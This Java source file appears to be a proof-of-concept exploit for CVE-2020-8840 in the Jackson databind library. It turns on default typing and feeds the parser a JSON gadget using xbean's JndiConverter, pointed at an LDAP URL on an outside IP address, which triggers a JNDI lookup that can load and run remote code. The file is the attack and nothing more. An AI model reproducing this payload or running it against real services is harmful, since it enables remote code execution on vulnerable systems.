package com.snowsec0.jackson;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;

public class executepoc {
	
	public static void main(String[] args) {
		
		ObjectMapper mapper = new ObjectMapper();

        mapper.enableDefaultTyping();

        String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://47.104.218.243:1389/Ps\"}]";

        try {
            mapper.readValue(json, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
        
		
		System.out.print("CVE-2020-8840");
	}

}
